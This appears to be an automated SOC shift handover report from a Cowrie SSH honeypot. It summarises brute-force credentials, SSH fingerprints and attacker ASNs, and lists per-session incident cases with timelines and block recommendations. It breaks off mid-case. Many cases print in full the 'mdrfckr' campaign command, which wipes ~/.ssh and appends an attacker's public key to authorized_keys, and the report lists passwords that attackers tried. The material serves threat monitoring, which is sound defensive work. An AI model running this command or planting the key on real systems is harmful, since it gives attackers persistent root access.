# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T05:48:27Z |
| **Shift Time** | 05:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **145** |
| Confirmed Threats | **143** |
| False Positives Filtered | **2** (1.4%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **9** |
| High Severity Cases | **60** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **124** |
| Unique Credential Pairs | **67** |
| Unique Usernames | **28** |
| Unique Passwords | **65** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 60 |
| `345gs5662d34` | 28 |
| `ubuntu` | 5 |
| `test` | 3 |
| `ftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 30 |
| `345gs5662d34` | 28 |
| `12` | 2 |
| `qwertyuiop!!` | 2 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 30 |
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `qwertyuiop!!` | 2 |
| `ftpuser` | `ftpuser10` | 1 |
| `test` | `!Q2w3e4r` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zzXX123123` | `180.93.172.213` | 2026-04-09T02:03:20 |
| `root` | `3245gs5662d34` | `180.93.172.213` | 2026-04-09T02:03:24 |
| `root` | `root123456789@123` | `180.93.172.213` | 2026-04-09T02:05:05 |
| `root` | `Dg123456` | `147.45.145.178` | 2026-04-09T02:07:06 |
| `root` | `3245gs5662d34` | `147.45.145.178` | 2026-04-09T02:07:17 |
| `root` | `ZAQ!2wsx2024#` | `180.93.172.213` | 2026-04-09T02:10:14 |
| `root` | `Qazwsx12@@` | `180.93.172.213` | 2026-04-09T02:13:42 |
| `root` | `qazwsx888$` | `147.45.145.178` | 2026-04-09T02:23:02 |
| `root` | `qazwsx01..` | `211.105.129.57` | 2026-04-09T02:32:05 |
| `root` | `3245gs5662d34` | `211.105.129.57` | 2026-04-09T02:32:09 |
| `root` | `qwertyu1234` | `211.105.129.57` | 2026-04-09T02:39:24 |
| `root` | `root111111@@` | `211.105.129.57` | 2026-04-09T02:41:59 |
| `root` | `root001!` | `211.105.129.57` | 2026-04-09T02:44:37 |
| `root` | `987789` | `211.105.129.57` | 2026-04-09T02:52:15 |
| `root` | `Aa1` | `211.105.129.57` | 2026-04-09T02:54:01 |
| `root` | `1Qazxsw2` | `211.105.129.57` | 2026-04-09T02:55:42 |
| `root` | `root26` | `211.105.129.57` | 2026-04-09T03:02:35 |
| `root` | `ABCabc123` | `211.105.129.57` | 2026-04-09T03:04:25 |
| `root` | `Qazwsx9999@123` | `211.105.129.57` | 2026-04-09T03:06:14 |
| `root` | `Welcome_1` | `211.105.129.57` | 2026-04-09T03:09:44 |
| `root` | `A12345691` | `211.105.129.57` | 2026-04-09T03:11:30 |
| `root` | `P@ssw0rd1983` | `211.105.129.57` | 2026-04-09T03:16:38 |
| `root` | `qwertyuiop!!` | `95.231.249.182` | 2026-04-09T04:10:25 |
| `root` | `3245gs5662d34` | `95.231.249.182` | 2026-04-09T04:10:29 |
| `root` | `QWERTYUIOP!` | `89.36.2.59` | 2026-04-09T04:19:38 |
| `root` | `3245gs5662d34` | `89.36.2.59` | 2026-04-09T04:19:43 |
| `root` | `Oracle1234` | `89.36.2.59` | 2026-04-09T04:21:10 |
| `root` | `Qazwsx999!!` | `89.36.2.59` | 2026-04-09T04:24:03 |
| `root` | `A123456789a` | `89.36.2.59` | 2026-04-09T04:30:02 |
| `root` | `qwertyuiop!!` | `89.36.2.59` | 2026-04-09T04:35:52 |
| `root` | `Root2024@#` | `89.36.2.59` | 2026-04-09T04:38:48 |
| `root` | `Rs123456` | `89.36.2.59` | 2026-04-09T04:41:52 |
| `root` | `Qazwsx123456789!@` | `89.36.2.59` | 2026-04-09T04:43:20 |
| `root` | `aa123456789bb` | `89.36.2.59` | 2026-04-09T04:44:49 |
| `root` | `Qazwsx11111111!!` | `89.36.2.59` | 2026-04-09T04:46:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **145** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |
| Go SSH scanner | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 124 | 5 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 124 | 5 | Modern SSH client |
| `95420f9d932d...` | Go SSH scanner | 7 | 4 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `211.105.129.57`, `147.45.145.178`, `95.231.249.182`, `180.93.172.213`, `89.36.2.59`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **11** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS135089` | China Telecom | 1 | HIGH |
| `AS135944` | VinhNam Commercial informatics service corporation | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS34977` | PROCONO S.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (60)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-35ed39bec91d

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:03 |
| **Last Seen** | 2026-04-09 02:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:03:19` | `cowrie.session.connect` |
| `2026-04-09 02:03:19` | `cowrie.client.version` |
| `2026-04-09 02:03:20` | `cowrie.client.kex` |
| `2026-04-09 02:03:20` | `cowrie.login.success` |
| `2026-04-09 02:03:21` | `cowrie.session.params` |
| `2026-04-09 02:03:21` | `cowrie.command.input` |
| `2026-04-09 02:03:21` | `cowrie.command.failed` |
| `2026-04-09 02:03:21` | `cowrie.log.closed` |
| `2026-04-09 02:03:21` | `cowrie.session.params` |
| `2026-04-09 02:03:21` | `cowrie.command.input` |
| `2026-04-09 02:03:21` | `cowrie.session.file_download` |
| `2026-04-09 02:03:21` | `cowrie.log.closed` |
| `2026-04-09 02:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950f66358d51

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:03 |
| **Last Seen** | 2026-04-09 02:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:03:23` | `cowrie.session.connect` |
| `2026-04-09 02:03:23` | `cowrie.client.version` |
| `2026-04-09 02:03:24` | `cowrie.client.kex` |
| `2026-04-09 02:03:24` | `cowrie.login.success` |
| `2026-04-09 02:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3e912c40d4

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:05 |
| **Last Seen** | 2026-04-09 02:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:05:04` | `cowrie.session.connect` |
| `2026-04-09 02:05:04` | `cowrie.client.version` |
| `2026-04-09 02:05:04` | `cowrie.client.kex` |
| `2026-04-09 02:05:05` | `cowrie.login.success` |
| `2026-04-09 02:05:05` | `cowrie.session.params` |
| `2026-04-09 02:05:05` | `cowrie.command.input` |
| `2026-04-09 02:05:05` | `cowrie.command.failed` |
| `2026-04-09 02:05:05` | `cowrie.log.closed` |
| `2026-04-09 02:05:06` | `cowrie.session.params` |
| `2026-04-09 02:05:06` | `cowrie.command.input` |
| `2026-04-09 02:05:06` | `cowrie.session.file_download` |
| `2026-04-09 02:05:06` | `cowrie.log.closed` |
| `2026-04-09 02:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1745b48a38

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:05 |
| **Last Seen** | 2026-04-09 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:05:08` | `cowrie.session.connect` |
| `2026-04-09 02:05:08` | `cowrie.client.version` |
| `2026-04-09 02:05:08` | `cowrie.client.kex` |
| `2026-04-09 02:05:09` | `cowrie.login.success` |
| `2026-04-09 02:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369b7b7ea7dd

| Field | Detail |
|---|---|
| **Source IP** | `147.45.145[.]178` |
| **First Seen** | 2026-04-09 02:07 |
| **Last Seen** | 2026-04-09 02:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:07:05` | `cowrie.session.connect` |
| `2026-04-09 02:07:05` | `cowrie.client.version` |
| `2026-04-09 02:07:06` | `cowrie.client.kex` |
| `2026-04-09 02:07:06` | `cowrie.login.success` |
| `2026-04-09 02:07:06` | `cowrie.session.params` |
| `2026-04-09 02:07:06` | `cowrie.command.input` |
| `2026-04-09 02:07:06` | `cowrie.command.failed` |
| `2026-04-09 02:07:06` | `cowrie.log.closed` |
| `2026-04-09 02:07:07` | `cowrie.session.params` |
| `2026-04-09 02:07:07` | `cowrie.command.input` |
| `2026-04-09 02:07:07` | `cowrie.session.file_download` |
| `2026-04-09 02:07:07` | `cowrie.log.closed` |
| `2026-04-09 02:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.145[.]178` to AbuseIPDB if not already reported
- [ ] Block `147.45.145[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd96c3d5d0b2

| Field | Detail |
|---|---|
| **Source IP** | `147.45.145[.]178` |
| **First Seen** | 2026-04-09 02:07 |
| **Last Seen** | 2026-04-09 02:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:07:16` | `cowrie.session.connect` |
| `2026-04-09 02:07:16` | `cowrie.client.version` |
| `2026-04-09 02:07:16` | `cowrie.client.kex` |
| `2026-04-09 02:07:17` | `cowrie.login.success` |
| `2026-04-09 02:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.145[.]178` to AbuseIPDB if not already reported
- [ ] Block `147.45.145[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6e3f1b9b4c

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:10 |
| **Last Seen** | 2026-04-09 02:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:10:14` | `cowrie.session.connect` |
| `2026-04-09 02:10:14` | `cowrie.client.version` |
| `2026-04-09 02:10:14` | `cowrie.client.kex` |
| `2026-04-09 02:10:14` | `cowrie.login.success` |
| `2026-04-09 02:10:15` | `cowrie.session.params` |
| `2026-04-09 02:10:15` | `cowrie.command.input` |
| `2026-04-09 02:10:15` | `cowrie.command.failed` |
| `2026-04-09 02:10:15` | `cowrie.log.closed` |
| `2026-04-09 02:10:15` | `cowrie.session.params` |
| `2026-04-09 02:10:15` | `cowrie.command.input` |
| `2026-04-09 02:10:15` | `cowrie.session.file_download` |
| `2026-04-09 02:10:15` | `cowrie.log.closed` |
| `2026-04-09 02:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bea5e03a222

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:10 |
| **Last Seen** | 2026-04-09 02:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:10:18` | `cowrie.session.connect` |
| `2026-04-09 02:10:18` | `cowrie.client.version` |
| `2026-04-09 02:10:18` | `cowrie.client.kex` |
| `2026-04-09 02:10:18` | `cowrie.login.success` |
| `2026-04-09 02:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b465141b8cf

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:13 |
| **Last Seen** | 2026-04-09 02:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:13:42` | `cowrie.session.connect` |
| `2026-04-09 02:13:42` | `cowrie.client.version` |
| `2026-04-09 02:13:42` | `cowrie.client.kex` |
| `2026-04-09 02:13:42` | `cowrie.login.success` |
| `2026-04-09 02:13:43` | `cowrie.session.params` |
| `2026-04-09 02:13:43` | `cowrie.command.input` |
| `2026-04-09 02:13:43` | `cowrie.command.failed` |
| `2026-04-09 02:13:43` | `cowrie.log.closed` |
| `2026-04-09 02:13:43` | `cowrie.session.params` |
| `2026-04-09 02:13:43` | `cowrie.command.input` |
| `2026-04-09 02:13:43` | `cowrie.session.file_download` |
| `2026-04-09 02:13:43` | `cowrie.log.closed` |
| `2026-04-09 02:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba54aa076a38

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-04-09 02:13 |
| **Last Seen** | 2026-04-09 02:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:13:46` | `cowrie.session.connect` |
| `2026-04-09 02:13:46` | `cowrie.client.version` |
| `2026-04-09 02:13:46` | `cowrie.client.kex` |
| `2026-04-09 02:13:46` | `cowrie.login.success` |
| `2026-04-09 02:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73b4f6aae011

| Field | Detail |
|---|---|
| **Source IP** | `147.45.145[.]178` |
| **First Seen** | 2026-04-09 02:23 |
| **Last Seen** | 2026-04-09 02:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:23:01` | `cowrie.session.connect` |
| `2026-04-09 02:23:01` | `cowrie.client.version` |
| `2026-04-09 02:23:01` | `cowrie.client.kex` |
| `2026-04-09 02:23:02` | `cowrie.login.success` |
| `2026-04-09 02:23:02` | `cowrie.session.params` |
| `2026-04-09 02:23:02` | `cowrie.command.input` |
| `2026-04-09 02:23:02` | `cowrie.command.failed` |
| `2026-04-09 02:23:02` | `cowrie.log.closed` |
| `2026-04-09 02:23:03` | `cowrie.session.params` |
| `2026-04-09 02:23:03` | `cowrie.command.input` |
| `2026-04-09 02:23:03` | `cowrie.session.file_download` |
| `2026-04-09 02:23:03` | `cowrie.log.closed` |
| `2026-04-09 02:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.145[.]178` to AbuseIPDB if not already reported
- [ ] Block `147.45.145[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c948a992fef4

| Field | Detail |
|---|---|
| **Source IP** | `147.45.145[.]178` |
| **First Seen** | 2026-04-09 02:23 |
| **Last Seen** | 2026-04-09 02:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:23:12` | `cowrie.session.connect` |
| `2026-04-09 02:23:12` | `cowrie.client.version` |
| `2026-04-09 02:23:12` | `cowrie.client.kex` |
| `2026-04-09 02:23:13` | `cowrie.login.success` |
| `2026-04-09 02:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.145[.]178` to AbuseIPDB if not already reported
- [ ] Block `147.45.145[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-752e22e0470a

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:32 |
| **Last Seen** | 2026-04-09 02:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
